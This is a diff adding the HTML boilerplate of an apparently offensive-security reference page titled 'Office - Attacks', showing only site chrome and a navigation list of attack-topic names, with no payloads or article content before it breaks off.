@@ -1,0 +1,4513 @@
+
+<!doctype html>
+<html lang="en" class="no-js">
+  <head>
+    
+      <meta charset="utf-8">
+      <meta name="viewport" content="width=device-width,initial-scale=1">
+      
+      
+      
+      <link rel="icon" href="../../assets/images/favicon.png">
+      <meta name="generator" content="mkdocs-1.3.1, mkdocs-material-8.4.3">
+    
+    
+      
+        <title>Office - Attacks - Payloads All The Things</title>
+      
+    
+    
+      <link rel="stylesheet" href="../../assets/stylesheets/main.6b80c2a2.min.css">
+      
+        
+        <link rel="stylesheet" href="../../assets/stylesheets/palette.cbb835fc.min.css">
+        
+      
+      
+    
+    
+    
+      
+        
+        
+        <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+        <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto:300,300i,400,400i,700,700i%7CRoboto+Mono:400,400i,700,700i&display=fallback">
+        <style>:root{--md-text-font:"Roboto";--md-code-font:"Roboto Mono"}</style>
+      
+    
+    
+    <script>__md_scope=new URL("../..",location),__md_hash=e=>[...e].reduce((e,_)=>(e<<5)-e+_.charCodeAt(0),0),__md_get=(e,_=localStorage,t=__md_scope)=>JSON.parse(_.getItem(t.pathname+"."+e)),__md_set=(e,_,t=localStorage,a=__md_scope)=>{try{t.setItem(a.pathname+"."+e,JSON.stringify(_))}catch(e){}}</script>
+    
+      
+
+    
+    
+  </head>
+  
+  
+    
+    
+      
+    
+    
+    
+    
+    <body dir="ltr" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent="">
+  
+    
+    
+      <script>var palette=__md_get("__palette");if(palette&&"object"==typeof palette.color)for(var key of Object.keys(palette.color))document.body.setAttribute("data-md-color-"+key,palette.color[key])</script>
+    
+    <input class="md-toggle" data-md-toggle="drawer" type="checkbox" id="__drawer" autocomplete="off">
+    <input class="md-toggle" data-md-toggle="search" type="checkbox" id="__search" autocomplete="off">
+    <label class="md-overlay" for="__drawer"></label>
+    <div data-md-component="skip">
+      
+        
+        <a href="#office-attacks" class="md-skip">
+          Skip to content
+        </a>
+      
+    </div>
+    <div data-md-component="announce">
+      
+    </div>
+    
+    
+      
+
+<header class="md-header" data-md-component="header">
+  <nav class="md-header__inner md-grid" aria-label="Header">
+    <a href="../.." title="Payloads All The Things" class="md-header__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    <label class="md-header__button md-icon" for="__drawer">
+      <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M3 6h18v2H3V6m0 5h18v2H3v-2m0 5h18v2H3v-2Z"/></svg>
+    </label>
+    <div class="md-header__title" data-md-component="header-title">
+      <div class="md-header__ellipsis">
+        <div class="md-header__topic">
+          <span class="md-ellipsis">
+            Payloads All The Things
+          </span>
+        </div>
+        <div class="md-header__topic" data-md-component="header-topic">
+          <span class="md-ellipsis">
+            
+              Office - Attacks
+            
+          </span>
+        </div>
+      </div>
+    </div>
+    
+      <form class="md-header__option" data-md-component="palette">
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: light)" data-md-color-scheme="default" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to dark mode"  type="radio" name="__palette" id="__palette_1">
+          
+            <label class="md-header__button md-icon" title="Switch to dark mode" for="__palette_2" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a4 4 0 0 0-4 4 4 4 0 0 0 4 4 4 4 0 0 0 4-4 4 4 0 0 0-4-4m0 10a6 6 0 0 1-6-6 6 6 0 0 1 6-6 6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+          
+          
+          <input class="md-option" data-md-color-media="(prefers-color-scheme: dark)" data-md-color-scheme="slate" data-md-color-primary="" data-md-color-accent=""  aria-label="Switch to light mode"  type="radio" name="__palette" id="__palette_2">
+          
+            <label class="md-header__button md-icon" title="Switch to light mode" for="__palette_1" hidden>
+              <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 18c-.89 0-1.74-.2-2.5-.55C11.56 16.5 13 14.42 13 12c0-2.42-1.44-4.5-3.5-5.45C10.26 6.2 11.11 6 12 6a6 6 0 0 1 6 6 6 6 0 0 1-6 6m8-9.31V4h-4.69L12 .69 8.69 4H4v4.69L.69 12 4 15.31V20h4.69L12 23.31 15.31 20H20v-4.69L23.31 12 20 8.69Z"/></svg>
+            </label>
+          
+        
+      </form>
+    
+    
+    
+      <label class="md-header__button md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+      </label>
+      <div class="md-search" data-md-component="search" role="dialog">
+  <label class="md-search__overlay" for="__search"></label>
+  <div class="md-search__inner" role="search">
+    <form class="md-search__form" name="search">
+      <input type="text" class="md-search__input" name="query" aria-label="Search" placeholder="Search" autocapitalize="off" autocorrect="off" autocomplete="off" spellcheck="false" data-md-component="search-query" required>
+      <label class="md-search__icon md-icon" for="__search">
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M9.5 3A6.5 6.5 0 0 1 16 9.5c0 1.61-.59 3.09-1.56 4.23l.27.27h.79l5 5-1.5 1.5-5-5v-.79l-.27-.27A6.516 6.516 0 0 1 9.5 16 6.5 6.5 0 0 1 3 9.5 6.5 6.5 0 0 1 9.5 3m0 2C7 5 5 7 5 9.5S7 14 9.5 14 14 12 14 9.5 12 5 9.5 5Z"/></svg>
+        <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M20 11v2H8l5.5 5.5-1.42 1.42L4.16 12l7.92-7.92L13.5 5.5 8 11h12Z"/></svg>
+      </label>
+      <nav class="md-search__options" aria-label="Search">
+        
+        <button type="reset" class="md-search__icon md-icon" aria-label="Clear" tabindex="-1">
+          <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M19 6.41 17.59 5 12 10.59 6.41 5 5 6.41 10.59 12 5 17.59 6.41 19 12 13.41 17.59 19 19 17.59 13.41 12 19 6.41Z"/></svg>
+        </button>
+      </nav>
+      
+    </form>
+    <div class="md-search__output">
+      <div class="md-search__scrollwrap" data-md-scrollfix>
+        <div class="md-search-result" data-md-component="search-result">
+          <div class="md-search-result__meta">
+            Initializing search
+          </div>
+          <ol class="md-search-result__list"></ol>
+        </div>
+      </div>
+    </div>
+  </div>
+</div>
+    
+    
+      <div class="md-header__source">
+        <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+      </div>
+    
+  </nav>
+  
+</header>
+    
+    <div class="md-container" data-md-component="container">
+      
+      
+        
+          
+        
+      
+      <main class="md-main" data-md-component="main">
+        <div class="md-main__inner md-grid">
+          
+            
+              
+              <div class="md-sidebar md-sidebar--primary" data-md-component="sidebar" data-md-type="navigation" >
+                <div class="md-sidebar__scrollwrap">
+                  <div class="md-sidebar__inner">
+                    
+
+
+<nav class="md-nav md-nav--primary" aria-label="Navigation" data-md-level="0">
+  <label class="md-nav__title" for="__drawer">
+    <a href="../.." title="Payloads All The Things" class="md-nav__button md-logo" aria-label="Payloads All The Things" data-md-component="logo">
+      
+  
+  <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 24 24"><path d="M12 8a3 3 0 0 0 3-3 3 3 0 0 0-3-3 3 3 0 0 0-3 3 3 3 0 0 0 3 3m0 3.54C9.64 9.35 6.5 8 3 8v11c3.5 0 6.64 1.35 9 3.54 2.36-2.19 5.5-3.54 9-3.54V8c-3.5 0-6.64 1.35-9 3.54Z"/></svg>
+
+    </a>
+    Payloads All The Things
+  </label>
+  
+    <div class="md-nav__source">
+      <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/" title="Go to repository" class="md-source" data-md-component="source">
+  <div class="md-source__icon md-icon">
+    
+    <svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 496 512"><!--! Font Awesome Free 6.2.0 by @fontawesome - https://fontawesome.com License - https://fontawesome.com/license/free (Icons: CC BY 4.0, Fonts: SIL OFL 1.1, Code: MIT License) Copyright 2022 Fonticons, Inc.--><path d="M165.9 397.4c0 2-2.3 3.6-5.2 3.6-3.3.3-5.6-1.3-5.6-3.6 0-2 2.3-3.6 5.2-3.6 3-.3 5.6 1.3 5.6 3.6zm-31.1-4.5c-.7 2 1.3 4.3 4.3 4.9 2.6 1 5.6 0 6.2-2s-1.3-4.3-4.3-5.2c-2.6-.7-5.5.3-6.2 2.3zm44.2-1.7c-2.9.7-4.9 2.6-4.6 4.9.3 2 2.9 3.3 5.9 2.6 2.9-.7 4.9-2.6 4.6-4.6-.3-1.9-3-3.2-5.9-2.9zM244.8 8C106.1 8 0 113.3 0 252c0 110.9 69.8 205.8 169.5 239.2 12.8 2.3 17.3-5.6 17.3-12.1 0-6.2-.3-40.4-.3-61.4 0 0-70 15-84.7-29.8 0 0-11.4-29.1-27.8-36.6 0 0-22.9-15.7 1.6-15.4 0 0 24.9 2 38.6 25.8 21.9 38.6 58.6 27.5 72.9 20.9 2.3-16 8.8-27.1 16-33.7-55.9-6.2-112.3-14.3-112.3-110.5 0-27.5 7.6-41.3 23.6-58.9-2.6-6.5-11.1-33.3 2.6-67.9 20.9-6.5 69 27 69 27 20-5.6 41.5-8.5 62.8-8.5s42.8 2.9 62.8 8.5c0 0 48.1-33.6 69-27 13.7 34.7 5.2 61.4 2.6 67.9 16 17.7 25.8 31.5 25.8 58.9 0 96.5-58.9 104.2-114.8 110.5 9.2 7.9 17 22.9 17 46.4 0 33.7-.3 75.4-.3 83.6 0 6.5 4.6 14.4 17.3 12.1C428.2 457.8 496 362.9 496 252 496 113.3 383.5 8 244.8 8zM97.2 352.9c-1.3 1-1 3.3.7 5.2 1.6 1.6 3.9 2.3 5.2 1 1.3-1 1-3.3-.7-5.2-1.6-1.6-3.9-2.3-5.2-1zm-10.8-8.1c-.7 1.3.3 2.9 2.3 3.9 1.6 1 3.6.7 4.3-.7.7-1.3-.3-2.9-2.3-3.9-2-.6-3.6-.3-4.3.7zm32.4 35.6c-1.6 1.3-1 4.3 1.3 6.2 2.3 2.3 5.2 2.6 6.5 1 1.3-1.3.7-4.3-1.3-6.2-2.2-2.3-5.2-2.6-6.5-1zm-11.4-14.7c-1.6 1-1.6 3.6 0 5.9 1.6 2.3 4.3 3.3 5.6 2.3 1.6-1.3 1.6-3.9 0-6.2-1.4-2.3-4-3.3-5.6-2z"/></svg>
+  </div>
+  <div class="md-source__repository">
+    GitHub
+  </div>
+</a>
+    </div>
+  
+  <ul class="md-nav__list" data-md-scrollfix>
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../.." class="md-nav__link">
+        Payloads All The Things [![Tweet](https://img.shields.io/twitter/url/http/shields.io.svg?style=social)](https://twitter.com/intent/tweet?text=Payloads%20All%20The%20Things,%20a%20list%20of%20useful%20payloads%20and%20bypasses%20for%20Web%20Application%20Security%20-%20by%20@pentest_swissky&url=https://github.com/swisskyrepo/PayloadsAllTheThings/)
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../BOOKS/" class="md-nav__link">
+        Books
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CONTRIBUTING/" class="md-nav__link">
+        CONTRIBUTING
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../TWITTER/" class="md-nav__link">
+        Twitter
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../YOUTUBE/" class="md-nav__link">
+        Youtube
+      </a>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_6" type="checkbox" id="__nav_6" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_6">
+          API Key Leaks
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="API Key Leaks" data-md-level="1">
+        <label class="md-nav__title" for="__nav_6">
+          <span class="md-nav__icon md-icon"></span>
+          API Key Leaks
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../API%20Key%20Leaks/" class="md-nav__link">
+        API Key Leaks
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_7" type="checkbox" id="__nav_7" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_7">
+          AWS Amazon Bucket S3
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="AWS Amazon Bucket S3" data-md-level="1">
+        <label class="md-nav__title" for="__nav_7">
+          <span class="md-nav__icon md-icon"></span>
+          AWS Amazon Bucket S3
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../AWS%20Amazon%20Bucket%20S3/" class="md-nav__link">
+        Amazon Bucket S3 AWS
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_8" type="checkbox" id="__nav_8" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_8">
+          Account Takeover
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Account Takeover" data-md-level="1">
+        <label class="md-nav__title" for="__nav_8">
+          <span class="md-nav__icon md-icon"></span>
+          Account Takeover
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Account%20Takeover/" class="md-nav__link">
+        Account Takeover
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_9" type="checkbox" id="__nav_9" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_9">
+          CORS Misconfiguration
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CORS Misconfiguration" data-md-level="1">
+        <label class="md-nav__title" for="__nav_9">
+          <span class="md-nav__icon md-icon"></span>
+          CORS Misconfiguration
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CORS%20Misconfiguration/" class="md-nav__link">
+        CORS Misconfiguration
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_10" type="checkbox" id="__nav_10" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_10">
+          CRLF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CRLF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_10">
+          <span class="md-nav__icon md-icon"></span>
+          CRLF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CRLF%20Injection/" class="md-nav__link">
+        CRLF
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_11" type="checkbox" id="__nav_11" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_11">
+          CSRF Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSRF Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_11">
+          <span class="md-nav__icon md-icon"></span>
+          CSRF Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSRF%20Injection/" class="md-nav__link">
+        Cross-Site Request Forgery
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_12" type="checkbox" id="__nav_12" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_12">
+          CSV Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CSV Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_12">
+          <span class="md-nav__icon md-icon"></span>
+          CSV Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CSV%20Injection/" class="md-nav__link">
+        CSV Injection (Formula Injection)
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_13" type="checkbox" id="__nav_13" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_13">
+          CVE Exploits
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="CVE Exploits" data-md-level="1">
+        <label class="md-nav__title" for="__nav_13">
+          <span class="md-nav__icon md-icon"></span>
+          CVE Exploits
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/" class="md-nav__link">
+        Common Vulnerabilities and Exposures
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../CVE%20Exploits/Log4Shell/" class="md-nav__link">
+        CVE-2021-44228 Log4Shell
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_14" type="checkbox" id="__nav_14" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_14">
+          Command Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Command Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_14">
+          <span class="md-nav__icon md-icon"></span>
+          Command Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Command%20Injection/" class="md-nav__link">
+        Command Injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_15" type="checkbox" id="__nav_15" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_15">
+          DNS Rebinding
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="DNS Rebinding" data-md-level="1">
+        <label class="md-nav__title" for="__nav_15">
+          <span class="md-nav__icon md-icon"></span>
+          DNS Rebinding
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../DNS%20Rebinding/" class="md-nav__link">
+        DNS Rebinding
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_16" type="checkbox" id="__nav_16" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_16">
+          Dependency Confusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Dependency Confusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_16">
+          <span class="md-nav__icon md-icon"></span>
+          Dependency Confusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Dependency%20Confusion/" class="md-nav__link">
+        Dependency Confusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_17" type="checkbox" id="__nav_17" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_17">
+          Directory Traversal
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Directory Traversal" data-md-level="1">
+        <label class="md-nav__title" for="__nav_17">
+          <span class="md-nav__icon md-icon"></span>
+          Directory Traversal
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Directory%20Traversal/" class="md-nav__link">
+        Directory traversal
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_18" type="checkbox" id="__nav_18" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_18">
+          File Inclusion
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="File Inclusion" data-md-level="1">
+        <label class="md-nav__title" for="__nav_18">
+          <span class="md-nav__icon md-icon"></span>
+          File Inclusion
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../File%20Inclusion/" class="md-nav__link">
+        File Inclusion
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_19" type="checkbox" id="__nav_19" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_19">
+          GraphQL Injection
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="GraphQL Injection" data-md-level="1">
+        <label class="md-nav__title" for="__nav_19">
+          <span class="md-nav__icon md-icon"></span>
+          GraphQL Injection
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../GraphQL%20Injection/" class="md-nav__link">
+        GraphQL injection
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_20" type="checkbox" id="__nav_20" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_20">
+          HTTP Parameter Pollution
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="HTTP Parameter Pollution" data-md-level="1">
+        <label class="md-nav__title" for="__nav_20">
+          <span class="md-nav__icon md-icon"></span>
+          HTTP Parameter Pollution
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../HTTP%20Parameter%20Pollution/" class="md-nav__link">
+        HTTP Parameter Pollution
+      </a>
+    </li>
+  
+
+            
+          
+        </ul>
+      </nav>
+    </li>
+  
+
+    
+      
+      
+      
+
+  
+  
+  
+    
+    <li class="md-nav__item md-nav__item--nested">
+      
+      
+        <input class="md-nav__toggle md-toggle" data-md-toggle="__nav_21" type="checkbox" id="__nav_21" >
+      
+      
+      
+      
+        <label class="md-nav__link" for="__nav_21">
+          Insecure Deserialization
+          <span class="md-nav__icon md-icon"></span>
+        </label>
+      
+      <nav class="md-nav" aria-label="Insecure Deserialization" data-md-level="1">
+        <label class="md-nav__title" for="__nav_21">
+          <span class="md-nav__icon md-icon"></span>
+          Insecure Deserialization
+        </label>
+        <ul class="md-nav__list" data-md-scrollfix>
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/" class="md-nav__link">
+        Insecure Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Java/" class="md-nav__link">
+        Java Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/PHP/" class="md-nav__link">
+        PHP Object injection
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
+      <a href="../../Insecure%20Deserialization/Python/" class="md-nav__link">
+        Python Deserialization
+      </a>
+    </li>
+  
+
+            
+          
+            
+              
+  
+  
+  
+    <li class="md-nav__item">
